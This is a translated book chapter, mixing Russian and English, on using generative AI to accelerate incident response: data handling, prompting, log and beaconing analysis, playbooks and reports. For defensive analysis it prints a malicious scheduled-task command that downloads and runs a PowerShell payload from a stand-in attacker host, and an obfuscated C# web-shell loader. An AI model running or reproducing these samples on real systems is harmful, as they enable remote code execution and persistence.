---
book_id: dynamic-incident-response-joshua-wright-en-2026
chapter_number: 16
source_title: "Accelerating Incident Response with AI"
source_pdf_page_range: "472-545"
rag_chunk_range:
  first: "dynamic-incident-response-joshua-wright-en-2026:p0472:c01"
  last: "dynamic-incident-response-joshua-wright-en-2026:p0545:c01"
translation_status: "ACCEPTED"
license_notice: "Неофициальный русский перевод / unofficial Russian translation; original work CC BY 4.0. См. ../ATTRIBUTION.md."
third_party_review_policy: "Third-party screenshots, quoted model outputs, photos, and embedded external materials remain fail-closed where marked."
translation_notes:
  - "Canonical English RAG is source of truth."
  - "Assembled from full-fidelity source-range segments."
  - "Commands, code, prompt structures, identifiers, and references are preserved where represented."
  - "Third-party/model reasoning content embedded in source is summarized or structurally represented rather than reproduced verbatim where fail-closed."
---

# Глава 16. Ускорение реагирования на инциденты с помощью ИИ

# INTRODUCTION

На начало 2026 года cybersecurity industry быстро внедряет AI tools.

Source отмечает сильный AI hype cycle:

- почти ежедневные announcements;
- frontier model providers;
- cloud SaaS providers;
- security vendors;
- обещания встроить AI в продукты и workflows.

Часть deployments оказывается реакцией на hype и leadership pressure, а не на доказанную operational value.

В penetration-testing work автор также наблюдал AI deployments, в которых:

- не хватает safeguards;
- AI-generated content не проверяется достаточно строго;
- accuracy и defensibility могут быть недостаточны.

При этом AI действительно может значительно ускорить incident-response analysis, если его применяют skilled analysts с appropriate controls.

Chapter сосредоточена на practical generative-AI applications для incident response:

- actionable techniques;
- реальная investigative work;
- ограничения и риски;
- immediate analyst productivity;
- integration into operations.

Основная цель:

> ускорить analysis, не отказываясь от verification, evidence quality и human judgment.

## AI как data-handling decision

Incident data часто содержит:

- PII;
- credentials;
- internal documentation;
- contractually protected content;
- legally protected information.

Source отдельно выделяет **shadow AI**:

analyst вставляет sensitive incident data в произвольный AI service, к которому имеет доступ.

Это может превратить уже contained incident в новый disclosure event.

Поэтому выбор AI platform — сначала **data-handling decision**, и только потом cost/capability decision.

# AI COSTS AND ACCESS

Примеры в chapter используют преимущественно публично доступные AI platforms, включая providers:

- OpenAI;
- Anthropic;
- Google;
- Microsoft.

Free tiers подходят для:

- learning;
- experiments;
- non-sensitive practice data.

Но free tiers могут иметь более слабые data-handling commitments, включая prompt retention для:

- training;
- quality assurance;
- abuse prevention;
- logging.

Для sustained production use organization должна учитывать расходы на:

- subscription;
- API usage;
- local/cloud infrastructure для open-weight models.

Выбор deployment зависит от:

- incident-response needs;
- data sensitivity;
- risk tolerance;
- compliance;
- budget.

Source рекомендует начинать с low-risk experimentation на non-sensitive data, а к real incident data переходить только после выбора platform с приемлемыми data-handling commitments.

# Opportunities and Cautions

AI capabilities, полезные для IR:

- pattern recognition;
- information synthesis;
- abstraction;
- rapid text processing;
- translation/adaptation for audiences.

Они могут уменьшать Mean Time to Respond (MTTR).

### Таблица 43. AI Capabilities and Limitations

| Capability | How it helps | Limitation |
|---|---|---|
| Pattern recognition | Finds anomalies in logs, traffic, system behavior | May produce false patterns or miss subtle indicators |
| Information synthesis | Combines findings from multiple sources | May misinterpret relationships or causality |
| Abstraction | Breaks complex problems into manageable components | May oversimplify nuanced technical situations |
| Rapid processing | Reviews large volumes of text quickly | Speed does not imply correctness |
| Translation | Reframes technical findings for different audiences | May omit details or use unsuitable tone |

## Hallucination Risk

AI models may provide incorrect information with the same confidence used for correct information.

Therefore:

- confident output is not evidence;
- AI findings require verification;
- AI-generated conclusions must not bypass analyst review.

## Non-Determinism

Same prompt may produce different outputs.

This is useful for exploring different perspectives, but complicates:

- reproducibility;
- consistency;
- finding validation.

## Data Handling

Commercial AI platforms may conflict with:

- regulatory obligations;
- security policy;
- contractual data restrictions.

## Training Cutoff / Staleness

Model knowledge may be outdated.

Risks include:

- deprecated tools;
- old threat intelligence;
- obsolete techniques.

Analysts must verify that recommendations remain current/applicable.

Source notes some organizations prohibit AI entirely.

Where AI is permitted, the correct posture is skeptical, evidence-driven use.

# Data Handling Considerations

Before using AI with incident data, understand how deployment type changes data exposure.

## Frontier Models

Commercial frontier providers cited:

- OpenAI;
- Anthropic;
- Google;
- Microsoft.

Advantages:

- strongest capability;
- good code/log/report performance;
- minimal setup.

Trade-off:

- data leaves organizational boundary and is processed on external infrastructure.

Enterprise/business agreements may state customer data is not used for training, but data may still be retained for:

- QA;
- abuse prevention;
- logging.

Decision makers must evaluate whether that risk is acceptable.

## Open-Weight Models

Examples in source:

- DeepSeek;
- Meta Llama;
- Microsoft Phi.

Local deployment keeps data under organizational control.

Costs/requirements:

- GPU infrastructure;
- technical expertise;
- operations/maintenance;
- updates.

Open-weight deployment in organization-controlled cloud is a middle ground:

- avoids sending data to third-party AI application provider;
- still uses cloud infrastructure;
- may align better with existing sensitive-workload governance.

Source characterizes current open-weight capability as generally below frontier models for:

- code analysis;
- log interpretation;
- complex reasoning;

while noting capability is improving rapidly and open models offer greater transparency/extensibility.

### Таблица 44. Comparison of AI Deployment Options

| Factor | Commercial Frontier | Open-Weight Cloud | Open-Weight Local |
|---|---|---|---|
| Capability | Highest complex-task performance | Moderate, improving | Moderate, improving |
| Data handling | External AI provider | Organization-controlled cloud provider | Data stays on local infrastructure |
| Cost model | Subscription/API | Cloud compute | Hardware + local compute/maintenance |
| Setup complexity | Low | Moderate | High |
| Best fit | Organizations accepting commercial handling | Privacy-sensitive cloud organizations | Highly regulated/local-control environments |

Hybrid use may be reasonable:

- commercial frontier for non-sensitive analysis;
- local/open-weight for regulated/sensitive data.

# Data Sanitization

When commercial AI use is permitted, analysts can reduce exposure through sanitization.

Source examples:

Replace real IPs with RFC 5737 TEST-NET ranges:

- \`192.0.2.0/24\`;
- \`198.51.100.0/24\`;
- \`203.0.113.0/24\`.

Replace domains with:

- \`example.com\`;
- \`example.net\`;
- \`example.org\`.

Redact:

- PII;
- credentials;
- API keys;
- organization names;
- employee identities.

RFC 5737 addresses are reserved for documentation, unlike RFC 1918 private ranges that may correspond to actual deployed networks.

Sanitization reduces risk, but does not eliminate it.

Patterns may still reveal:

- architecture;
- infrastructure relationships;
- organizational practice.

Source cites deanonymization of the Netflix Prize dataset as a cautionary example.[1]

Organization should define explicit policy:

- what incident data may be sent to external AI;
- under what conditions;
- through which approved platforms.

# Chapter Organization

Chapter progresses from simple to advanced:

1. prompting foundations;
2. foundational web-interface use cases;
3. intermediate reusable workflows;
4. advanced MCP/tool orchestration;
5. operational verification/documentation/training.

Underlying principles remain:

- clear instructions;
- source verification;
- controlled data handling;
- human review.

# PROMPTING FOUNDATIONS

Prompting is the process of refining instructions so AI produces useful output.

Poorly defined prompts produce:

- weak;
- incomplete;
- misleading;

results.

## Quick Prompting Tips

### Таблица 45. Quick Prompting Techniques for Incident Response

| Technique | Example use |
|---|---|
| Iterative prompting | Start broad, then progressively narrow analysis |
| Use delimiters | Clearly separate instructions from log/report data |
| Request structured output | JSON/table/schema for consistent downstream use |
| Assign a role | Define expected technical perspective |
| Stepwise reasoning request | Ask model to work through attack progression systematically |
| Ask what is needed | Let model identify missing context/data before analysis |

### Рисунок 142. ChatGPT Prompt for Log File Analysis

THIRD_PARTY_REVIEW_REQUIRED — product screenshot not reproduced.

Source emphasizes iterative prompting:

- initial output is rarely final;
- analyst reviews;
- identifies missing detail;
- asks follow-up questions;
- context accumulates.

Practice these techniques on low-stakes tasks before active incidents.

# Structured Prompts for Complex Tasks

Simple prompts work for simple tasks.

Complex/reusable tasks benefit from structured prompts with explicit elements:

- role;
- objective;
- instructions;
- constraints;
- reasoning steps;
- output format;
- examples;
- context;
- summary/reminder of constraints.

Structured prompts often use:

- Markdown;
- XML-style tags.

This helps distinguish instructions from data.

### Listing 122. Structured Prompt for IOC Extraction

~~~text
# Task
Extract indicators of compromise from the threat report below.

<report>
This report details adversaries deploying novel AI-enabled malware in active operations. APT28
(FROZENLAKE) deployed PROMPTSTEAL malware against Ukraine using Hugging Face API to query
Qwen2.5-Coder-32B-Instruct LLM for command generation. VirusTotal hash:
766c356d6a4b00078a0293460c5967764fcd788da8c1cd1df708695f3a15b777

UNC1069 (MASAN) conducted cryptocurrency theft campaigns researching wallet locations and
credential extraction. TEMP.Zagros exposed their C2 domain malicious-c2.example.com and
encryption keys while requesting help with encrypted C2 scripts. APT42 developed phishing
campaigns targeting think tanks using translation assistance and data processing agents.
</report>

# Output Requirements
- File hashes (MD5, SHA1, SHA256)
- Domain names and IP addresses
- Malware family names
- Threat actor identifiers

Format as a table with columns: Indicator Type, Value, Associated Threat Actor
~~~

Prompt development itself should be iterative:

1. start without examples;
2. review output;
3. manually correct strongest result;
4. use corrected output as one-shot/few-shot example;
5. version-control prompt changes.

Git is specifically recommended for prompt libraries and versioning across:

- teams;
- models;
- use cases.

# FOUNDATIONAL USE CASES

Three immediate use cases:

1. code/deobfuscation analysis;
2. log triage/anomaly detection;
3. translating technical findings for stakeholders.

These can be used through standard web AI interfaces without special integration.

# Code Analysis and Deobfuscation

IR analysts often encounter:

- malware;
- scripts;
- persistence commands;
- exploit tooling;
- unfamiliar languages.

AI can:

- explain code;
- identify suspicious behavior;
- decode/clarify obfuscation;
- help analysts understand unfamiliar syntax.

## Suspicious Scheduled Task Example

### Listing 123. Windows Scheduled Task Command Runs PowerShell

~~~text
schtasks /create /tn "Windows Security Audit" /tr "powershell.exe -WindowStyle Hidden
-ExecutionPolicy Bypass -Command \"IEX ([System.Text.Encoding]::UTF8.GetString((Invoke-
WebRequest -Uri 'http://attackerc2.tld/payload.ps1' -UseBasicParsing).Content))\"" /sc onevent
/ec Security /mo "*[System[EventID=4625]]" /ru SYSTEM /f
~~~

The task:

- creates a Windows scheduled task;
- triggers on failed login Event ID 4625;
- launches hidden PowerShell;
- bypasses execution policy;
- downloads a remote payload;
- executes content in memory;
- runs as SYSTEM.

The next source range demonstrates model-assisted explanation of this command.

### Listing 124. Code Analysis Prompt

~~~text
Explain what the Windows command does in triple quotes below. Identify any malicious or
suspicious functionality. Break down each component of the command and explain its purpose.

"""
schtasks /create /tn "Windows Security Audit" /tr "powershell.exe -WindowStyle Hidden
-ExecutionPolicy Bypass -Command \"IEX ([System.Text.Encoding]::UTF8.GetString((Invoke-
WebRequest -Uri 'http://attackerc2.tld/payload.ps1' -UseBasicParsing).Content))\"" /sc onevent
/ec Security /mo "*[System[EventID=4625]]" /ru SYSTEM /f
"""
~~~

Google Gemini в source example объясняет, что command:

- создаёт scheduled task;
- запускает hidden PowerShell;
- реагирует на failed-login security event;
- загружает remote script;
- выполняет его с SYSTEM privileges.

### Рисунок 143. Google Gemini Analysis of Schtasks and PowerShell Commands

THIRD_PARTY_REVIEW_REQUIRED — screenshot/model output visual не воспроизводится.

Source example highlights suspicious components:

- remote payload execution;
- \`IEX\` / Invoke-Expression;
- remote download;
- SYSTEM context;
- hidden window;
- Event ID 4625 trigger.

AI может сократить initial code-understanding time с минут до секунд, после чего analyst задаёт follow-up questions:

- почему Event ID 4625 важен?
- как обнаружить task?
- какие artifacts останутся?
- как hunt for similar behavior?

Для менее опытных analysts AI также может выступать обучающим aid для unfamiliar languages/techniques.

# VERIFICATION IS NON-NEGOTIABLE

AI code analysis необходимо верифицировать.

Models могут:

- misidentify functions;
- incorrectly explain behavior;
- omit important details;
- hallucinate confident conclusions.

Recommended verification:

- official API/command documentation;
- comparison across models;
- isolated execution/testing where safe;
- treat AI output as hypothesis/starting point.

Unverified AI output нельзя использовать как authoritative basis for:

- legal documentation;
- regulatory attestations;
- material stakeholder communication.

# Iterative Analysis for Complex Artifacts

Complex code benefits from progressive analysis:

1. overall behavior;
2. specific functions;
3. decode content;
4. detection perspective;
5. eradication perspective;
6. hunting perspective;
7. non-technical summary.

Context accumulates across the conversation.

## C# Obfuscated Malware Example

### Listing 125. C# Malware Sample with Obfuscation

~~~csharp
void Page_Load(object sender, EventArgs e)
{
    string p = "42a9798b99d4afcec9995e47a1d246b98ebc96be7a732323eee39d924006ee1d";
    string r = Request.Form["data"];
    // Obfuscated assembly bytes, approximately 1 KB, removed for brevity
    byte[] a = {0x79,0x68,0xf1,0x39,0x34,0x39,0x38,0x62,0x3d,0x39,0x64,0x34,0x9e,0x99,0x63,0x65,
    0xdb,0x39,0x39,0x39,0x35,0x65,0x34,0x37,0x21,0x31,0x64,0x32,0x34,0x36,0x62,0x39,0x38,0x65,
    0x62,0x63,0x39,0x36,0x62,0x65,0x37,0x61,0x37,0x33,0x32,0x33,0x32,0x33,0x65,0x65,0x65,0x33,
    0x39,0x64,0x39,0x32,0x34,0x30,0x30,0x36,0xe5,0x65,0x31,0x64,0x3a,0x2d,0xdb,0x37,0x37,0x8d,
    0x31,0xaf,0x18,0x81,0x65,0x78,0xac,0x47,0x37,0xd,0xa,0x4a,0x19,0x49,0x47,0xa,0x53,0x45,0x0,
    0x5c,0x44,0x51,0x55,0x58,0xc,0x56,0x4c,0x45,[...],0x30,0x36,0x65,0x65,0x31,0x64};
    for(int i = 0; i < a.Length; i++) a[i] ^= (byte)p[i % p.Length];
    Assembly aS = Assembly.Load(a);
    object o = aS.CreateInstance("SharPy");
    MethodInfo mi = o.GetType().GetMethod("Run");
    object[] iN = new object[] {r, p};
    object oU = mi.Invoke(o, iN);
    Response.Write(oU);
}
~~~

Initial AI analysis identifies a large embedded byte array as likely:

- encrypted/compressed data;
- second-stage payload;
- encoded lookup/payload structure.

### Рисунок 144. Code Analysis Prompt for C# Malware

THIRD_PARTY_REVIEW_REQUIRED — third-party model-output screenshot not reproduced.

Follow-up analysis asks how array \`a\` is actually transformed/used.

### Рисунок 145. Follow-up Prompt for C# Malware Analysis

THIRD_PARTY_REVIEW_REQUIRED.

Source model analysis reports that XOR-decrypted bytes begin with:

- \`MZ\` PE header;
- .NET metadata marker \`BSJB\`;
- framework string such as \`v2.0.50727\`.

Embedded strings include:

- \`runtime_compiler_xor.dll\`;
- \`SharPy\`;
- \`Xor_Enc_Dec\`;
- \`FromBase64String\`;
- \`Microsoft.CSharp\`;
- \`CSharpCodeProvider\`;
- \`System.CodeDom.Compiler\`;
- \`CompileAssemblyFromSource\`;
- \`System.Reflection\`.

Interpretation in source:

the embedded assembly appears designed to:

- accept runtime content/code;
- decode/decrypt Base64 + XOR;
- compile with CodeDom/CSharpCodeProvider;
- execute through reflection.

Further iterations can ask about:

- artifacts;
- detection;
- language concepts;
- audience-specific reporting.

# MODEL GUARDRAILS AND MALWARE ANALYSIS

AI platforms implement different safety/guardrail policies.

Source notes malware analysis can sit in a gray area:

- defensive reverse engineering is legitimate;
- deobfuscating/reproducing malicious code can also enable harmful use.

Different providers may refuse different requests.

### Рисунок 146. Claude Malware Analysis Guardrail Response

THIRD_PARTY_REVIEW_REQUIRED.

### Рисунок 147. Grok Malware Analysis Response

THIRD_PARTY_REVIEW_REQUIRED.

Source cautions that trying to manipulate models to bypass guardrails is:

- unreliable;
- operationally fragile;
- a poor basis for a dependable malware-analysis workflow.

Self-hosted open-weight models may provide more flexibility but can have lower capability than frontier models.

# Log Analysis and Anomaly Detection

Log analysis consumes substantial IR time.

Typical sources:

- authentication;
- network;
- application;
- security alerts.

AI can accelerate first-pass triage and anomaly identification.

## Use Cases for AI Log Analysis

### Initial Orientation

For unfamiliar formats, AI can help identify:

- record structure;
- field meanings;
- likely useful fields;
- unusual entries.

This reduces time spent orienting before substantive analysis.

### Anomaly Identification

Models can surface obvious anomalies such as:

- unusual geolocation;
- off-hours access;
- repeated automated patterns;
- suspicious authentication behavior.

These are investigation leads, not final conclusions.

### Report Preparation

AI can turn raw logs into:

- tables;
- timelines;
- narrative summaries.

Analyst must verify summaries against source data before formal use.

### Query Generation

Models can generate SIEM queries for platforms such as:

- Splunk;
- Sentinel;
- Chronicle.

Generated queries must be reviewed and tested.

# Microsoft 365 Authentication Log Triage

Source example uses Microsoft 365 access logs exported as JSON and Claude Opus to identify events of interest.

### Рисунок 148. Log File Analysis Prompt

THIRD_PARTY_REVIEW_REQUIRED.

The model identifies multiple anomalies, summarized in the next range.

### Рисунок 149. Log File Analysis Response

THIRD_PARTY_REVIEW_REQUIRED.

# Microsoft 365 Authentication Log Analysis — Results

### Таблица 46. Microsoft 365 Authentication Log Analysis Summary

| Timestamp UTC | IP | ASN | Location | App | Result |
|---|---|---|---|---|---|
| 02:51:01 | 3.12.217.120 | 16509 AWS | Columbus, OH | Microsoft Office | FAIL |
| 03:35:24 | 3.12.217.149 | 16509 AWS | Columbus, OH | Azure PowerShell | FAIL |
| 03:37:10 | 44.210.66.209 | 14618 AWS | Ashburn, VA | Authenticator App | FAIL |
| 03:38:14 | 3.15.35.2 | 16509 AWS | Columbus, OH | Azure CLI | FAIL |
| 03:39:18 | 3.15.35.215 | 16509 AWS | Columbus, OH | Visual Studio | FAIL |
| 03:40:22 | 3.12.216.177 | 16509 AWS | Columbus, OH | Azure CLI | SUCCESS |
| 12:06:25 | 173.166.135.199 | 7922 Comcast | Columbia, MD | Edge Browser | SUCCESS |
| 12:06:48 | 173.166.135.199 | 7922 Comcast | Columbia, MD | Edge Browser | SUCCESS |

Interpretation from source:

- five failed spray attempts precede success;
- attacker authenticates at 03:40:22;
- authentication comes from AWS;
- app is Azure CLI;
- legitimate user later authenticates from Maryland ~8 hours later;
- user appears unaware of compromise.

AI-assisted triage allows analyst to focus detailed review on:

- suspicious time window;
- source IP ranges;
- authentication method/app;
- account activity after success.

Findings still require verification against:

- original log data;
- SIEM;
- authoritative identity telemetry.

# Beaconing Detection: Network Proxy Data

Proxy logs can reveal C2 through regular request intervals.

Beaconing analysis is difficult manually when logs contain tens of thousands of records.

### Рисунок 150. Beaconing Detection Prompt

THIRD_PARTY_REVIEW_REQUIRED.

Source example uses Claude Opus.

The model recognizes that effective detection needs statistical analysis rather than only string matching.

It proposes measuring regularity of request intervals using **coefficient of variation (CV)**.

Lower CV indicates more regular timing, which may suggest automated beaconing.

### Рисунок 151. Beaconing Analysis Python Script

THIRD_PARTY_REVIEW_REQUIRED — generated script screenshot not reproduced.

The model then identifies two highly suspicious domains.

### Рисунок 152. Beaconing Analysis Results

THIRD_PARTY_REVIEW_REQUIRED.

### Таблица 47. Beaconing Detection Findings Summary

| Domain | Suspicious indicators | Beacon interval | Affected hosts | Confidence |
|---|---|---:|---:|---|
| \`www1-google-analytics.com\` | Google Analytics typosquat, HTTP not HTTPS, CV=0.02, 9,075 requests | ~5 sec | 4 | Very High |
| \`email.falsimentis.com\` | Unknown domain, HTTP, near-perfect intervals CV=0.004, POST with query string | ~60 sec | 4 | High |

Source model additionally integrated online CTI, identifying \`www1-\` prefix typosquatting behavior.

The broader point:

AI may help select the analytical method itself, not only execute a predefined search.

Potential acceleration:

- statistical method selection;
- script generation;
- CTI enrichment;
- finding synthesis.

# Limitations of AI Log Analysis

## Incomplete Detection

Models may miss:

- subtle indicators;
- novel TTPs;
- crafted evasions.

Use AI as first-pass triage, not complete detection control.

## False Positives

Legitimate unusual behavior can be flagged as malicious.

Every alert/findings requires analyst validation.

## Lack of Definitive Conclusions

Models may hedge:

- "may be";
- "looks like";
- "possibly".

Impact/attribution still needs human assessment.

## Context Window Constraints

Models can only process bounded input per interaction.

Source example cites a frontier context window of roughly:

- 200,000 tokens;
- ~150,000 words;
- ~500 pages.

This is large but still insufficient for enterprise-scale log volumes.

Direct chat analysis works for:

- several thousand log lines;
- targeted time windows;
- initial triage;
- focused investigations.

Large-scale analysis needs:

- iterative processing;
- agentic workflows;
- state across multiple interactions.

These are covered later in Chapter 16.

# Translating Technical Findings for Stakeholders

Different audiences need different communication:

- executives → business impact/risk;
- legal → precise technical/regulatory facts;
- stakeholders → service-impact guidance.

AI can accelerate drafting:

- status updates;
- summaries;
- reports;
- audience-specific translations.

# Executive Summary Generation

### Listing 126. Executive Summary Generation Prompt

~~~text
Transform the following technical incident timeline into an executive summary suitable for
senior leadership. Focus on business impact, risk exposure, and response actions. Avoid
technical jargon. The summary should be no more than five bullet points.

Technical Timeline:

- 2026-01-07 14:32 Initial access via phishing email to user jwalcott@falsimentis.com on FM-CEO
- 2026-01-07 14:45 Malware execution, C2 beacon established to 203.0.113.47
- 2026-01-07 15:12 PowerShell script execution for credential harvesting from Chrome local
storage
- 2026-01-07 15:34 Lateral movement to file server FM-FS01 using harvested credentials
- 2026-01-07 16:02 Data staging, 2.3GB archived to C:\Users\Public\backup.zip
- 2026-01-07 16:18 Data exfiltration to Box.com cloud storage
- 2026-01-07 16:45 Possible infostealer binary executed on FM-FS01
- 2026-01-07 16:45 FM-FS01 EDR alert triggered, investigation initiated
~~~

Source model output converts this into executive-language bullets covering:

- confirmed unauthorized access;
- phishing origin;
- lateral movement;
- potential 2.3 GB exfiltration;
- credential theft;
- security detection and response;
- immediate priorities:
  - determine exact data exposure;
  - secure systems/accounts;
  - assess legal/notification obligations;
  - harden controls.

Analyst must verify:

- factual accuracy;
- tone;
- organizational terminology.

# INTERMEDIATE USE CASES

More structured AI workflows include:

- playbook generation;
- report drafting;
- tabletop exercise generation.

# Generating Incident Response Playbooks

Playbooks provide step-by-step guidance for specific incident types.

They combine:

- generic response model:
  - DAIR;
  - NIST SP 800-61;
- EOI-specific techniques;
- organization-specific tooling/policy.

Benefits:

- analyst guidance during active incidents;
- response consistency across teams;
- repeatability.

Manual playbook authoring is expensive because:

- TTPs change;
- tooling changes;
- environments differ;
- many EOI types exist.

AI can accelerate the first draft, which analysts then validate/customize.

# Structured Prompt for Playbook Generation

Source references a DAIR playbook prompt at:

\`https://urls.sec504.org/playbookprompt\` [2]

The prompt defines:

- role/objective;
- instructions;
- reasoning steps;
- output format;
- context;
- example playbook.

### Рисунок 153. IR Playbook Generation Structured Prompt

THIRD_PARTY_REVIEW_REQUIRED.

### Listing 127. DAIR Model Incident Response Playbook Generation Prompt — Structure

~~~text
$ wget -q https://urls.sec504.org/playbookprompt -O playbookprompt.txt
$ grep -E "^#" playbookprompt.txt
# Role and Objective/Task
# Instructions
# Reasoning Steps
# Output Format
## Overview
## Description
### Detect Steps
### Verify Steps
### Triage Steps
### Scope Steps
### Contain Steps
### Eradicate Steps
### Recover Steps
### Debrief Steps
## References
## Version Control
# Example Playbook
# Summary
~~~

Some output is omitted for brevity in source.

The prompt asks for:

- specific EOI;
- organizational tools;
- policies;
- environmental context.

Example EOI:

- Windows infostealer;
- exfiltration via cloud storage.

### Рисунок 154. Playbook Generation Model Response

THIRD_PARTY_REVIEW_REQUIRED.

Source notes reasoning-capable model use may improve adherence to complex prompt structure, but the critical requirement is validation, not model branding.

### Listing 128. Playbook Generation Output Excerpt

~~~text
# IR Playbook - Windows Infostealer With Cloud Storage Exfiltration

## Overview

The purpose of this playbook is to guide incident responders through detection, verification,
triage, scoping, containment, eradication, and recovery for a suspected Windows infostealer
infection where stolen data is being staged and exfiltrated via a cloud storage service (e.g.,
OneDrive/SharePoint, Dropbox, Google Drive, Box).

## Description

This event involves one or more Windows endpoints exhibiting infostealer behavior...
~~~

Generated playbook uses DAIR waypoints and EOI-specific details.

Source excerpt includes an AI-generated external citation artifact in the model output; this is preserved conceptually but not treated as canonical evidence.

The excerpt continues in next source range.

# Playbook Generation — Continuation

Generated example continues with immediate scoping/context questions.

Relevant cloud-storage scope:

- OneDrive/SharePoint;
- Dropbox;
- Google Drive;
- Box;
- other services.

Scope hints include:

- single host/user or multiple;
- VIPs;
- regulated data.

Endpoint-centric context commands:

### Listing 128. Playbook Generation Output Excerpt — Continuation

~~~powershell
hostname
whoami
quser
ipconfig /all
Get-Date
~~~

The generated playbook continues through all DAIR waypoints.

# Refining Generated Playbooks

AI-generated playbooks are drafts, not operationally trusted procedures.

Refinement checklist:

- verify commands/queries syntactically;
- align tools with actual environment;
- add organization contacts;
- add escalation paths;
- add approvals;
- remove non-applicable steps;
- test procedures where possible.

A refined playbook can then become a one-shot example for future generation, improving consistency.

# Drafting Incident Reports

AI can accelerate conversion of investigation findings into structured reports.

The analyst provides:

- incident facts;
- desired audience;
- requested structure.

Model returns a draft for human review.

### Listing 129. Executive Report Draft Prompt with Incident Findings

~~~text
Using the incident findings below, create a draft incident summary report suitable for executive
leadership. Follow this structure:

1. Executive Overview (incident type, detection date, brief description, business impact)
2. Key Findings (what happened, what was affected, what data was at risk)
3. Response Actions Taken (containment, eradication, recovery status)
4. Recommendations (immediate actions, longer-term improvements)
5. Decisions Required (what leadership needs to approve or fund)

# Incident Findings - SampleCorp Breach

## Affected Systems

- WKST01.samplecorp.com (development environment, source code and API credentials)
- HR01.samplecorp.com (HR system, employee PII including SSNs)

## Timeline

- 2026-01-15 00:27 - Employee opened malicious PDF (cv.pdf) exploiting Adobe Reader vulnerability
- 2026-01-15 00:35 - Unauthorized access to development directories and API keys
- 2026-01-15 00:50 - Lateral movement via buffer overflow in HR application
- 2026-01-15 01:30 - Employee database compressed and exfiltrated via SSH tunnel
- 2026-01-15 02:30 - SOC detected activity, isolated systems via VLAN
- 2026-01-15 03:43 - Firewall rules updated blocking C2 IP 192.168.220.66
- 2026-01-15 04:11 - Malware removed from both systems
- 2026-01-15 05:21-05:58 - Both systems restored from verified backups

## Technical Details

- Initial vector: Malicious PDF exploiting CVE in Adobe Reader 10.0
[...]
~~~

Source notes omitted technical detail for brevity.

Claude Opus generated a Word report without explicit format instruction.

### Рисунок 155. Completed Executive Report Prompt Results

THIRD_PARTY_REVIEW_REQUIRED.

### Рисунок 156. Executive Report Draft Output Excerpt

THIRD_PARTY_REVIEW_REQUIRED.

Key warning:

AI-generated reports may:

- misinterpret findings;
- invent plausible details;
- omit important facts;
- use inappropriate tone;
- overfit expected patterns.

Therefore draft reports must be reviewed before distribution.

Treat AI as:

- formatter;
- organizer;
- drafting accelerator.

Not final approver.

# Enhancing Report Quality with Specialized Knowledge

Generic models do not automatically know:

- organization report standards;
- desired tone;
- preferred structure;
- incident-specific reporting best practices.

Specialized knowledge can improve results.

# Specialized Knowledge Integration with MCP

MCP can connect models to external guidance and report-quality criteria.

Instead of embedding all standards in each prompt, model can query:

- public best-practice MCP;
- internal report standards;
- templates;
- prior approved examples.

Possible deployment approaches:

- public MCP;
- internal MCP;
- hybrid.

If MCP cannot be deployed, guidance can still be embedded in prompts/local docs.

# Zeltser IR Report Guidance

Source describes an MCP server by Lenny Zeltser.[4]

Primary capabilities:

1. report-creation guidance;
2. draft evaluation;
3. support for multiple security-report types.

Evaluation criteria include:

- executive-summary clarity;
- impact framing;
- non-blaming tone;
- action-item prioritization.

### Listing 130. MCP Server Configuration Command

~~~bash
claude mcp add zeltser-search --transport http https://website-mcp.zeltser.com/mcp
~~~

### Рисунок 157. MCP Server and Claude Code Configuration Example

THIRD_PARTY_REVIEW_REQUIRED.

Example review request:

~~~text
Review the IR report in @Incident\ Report.docx using zeltser-search.
~~~

### Рисунок 158. MCP Server and Claude Code, Report Advice Prompt

THIRD_PARTY_REVIEW_REQUIRED.

Source example evaluates a Hack The Box SampleCorp report.

### Listing 131. Zeltser MCP Server Report Evaluation Output — Key Findings

The evaluation identifies:

- executive summary too long;
- unresolved data-exfiltration inconsistency;
- missing time zones;
- missing owners/timelines;
- unaddressed regulatory obligations;
- insufficient business-impact quantification.

Example recommendation:

- shorten executive summary substantially;
- move detailed impact discussion to dedicated section;
- append explicit UTC/EDT or other zone to timestamps;
- resolve factual contradictions before distribution.

The point is not the exact generated wording, but specialized quality criteria improving model review.

# Creating Tabletop Exercise Scenarios

AI can help facilitators generate:

- concepts;
- injects;
- artifacts;
- decision points;
- exercise guidance.

Three levels:

1. generic scenario ideation;
2. organizationally grounded scenarios;
3. interactive/gamified scenarios.

# Generating Scenario Ideas

### Listing 132. Basic Tabletop Exercise Scenario Prompt

~~~text
Generate three tabletop exercise scenario concepts for an incident response team. Each scenario
should:

- Be based on current threat actor techniques and realistic attack patterns
- Target a mid-sized organization in the healthcare sector
- Progress through multiple phases allowing discussion at each stage
- Include decision points that test communication, escalation, and containment procedures
- Run approximately 90 minutes with a facilitator guiding discussion

For each scenario, provide:
- Initial compromise method
- Three progressive injects that complicate the response
- Key learning objectives
- Discussion questions for each phase
~~~

Google Gemini generates multiple candidates.

### Listing 133. Google Gemini Tabletop Exercise Scenario Example — Summary

Scenario:

- theme: AiTM phishing + double-extortion ransomware;
- target: mid-sized healthcare finance/billing;
- duration: ~90 minutes.

Initial compromise:

- fake urgent CFO message;
- AI-generated deepfake content;
- proxied Microsoft 365 login;
- credential + active-session token capture;
- MFA bypass through session hijacking.

Inject 1:

- SOC sees anomalous data movement;
- suspicious geographic/IP behavior;
- simultaneous local and VPN-exit activity.

Source truncates later injects for brevity.

These generated concepts are starting points to refine based on:

- team maturity;
- recent incidents;
- learning goals.

# Organizationally-Grounded Scenarios

More useful scenarios can use sanitized real artifacts:

- M365 audit logs;
- network diagrams;
- inventories;
- authentication records.

Benefits:

- real naming patterns;
- familiar log structure;
- realistic baseline behavior;
- easier participant engagement.

### Listing 134. Organizationally-Grounded Tabletop Exercise Scenario Prompt

~~~text
Using the Microsoft 365 audit log data attached, develop a business email compromise tabletop
exercise scenario. The scenario should:

- Use actual usernames, email patterns, and authentication behaviors from the logs to establish
  realistic baseline activity
- Identify a plausible initial compromise vector consistent with the authentication patterns
  observed
- Create a timeline of attacker actions that would produce log entries similar in format and
  structure to the provided data
- Include three progressive injects that reveal new information through additional log entries
- Provide facilitator guidance on what log patterns participants should identify at each phase

Learning objectives:

- Email header analysis for spoofing detection
- Correlation of authentication logs with email activity
- Escalation procedures for financial fraud attempts
- Communication with executive stakeholders during active fraud attempts
~~~

Scenario continues in next source range.

# Organizationally-Grounded Scenarios — Continuation

Source example uses Google Gemini with a Microsoft 365 interactive-login dataset.

The model:

- analyzes log structure;
- identifies normal patterns;
- constructs attacker activity as anomalies against that baseline;
- aligns compromise vector and injects to real-looking telemetry.

Target duration in source example:

- 30 minutes.

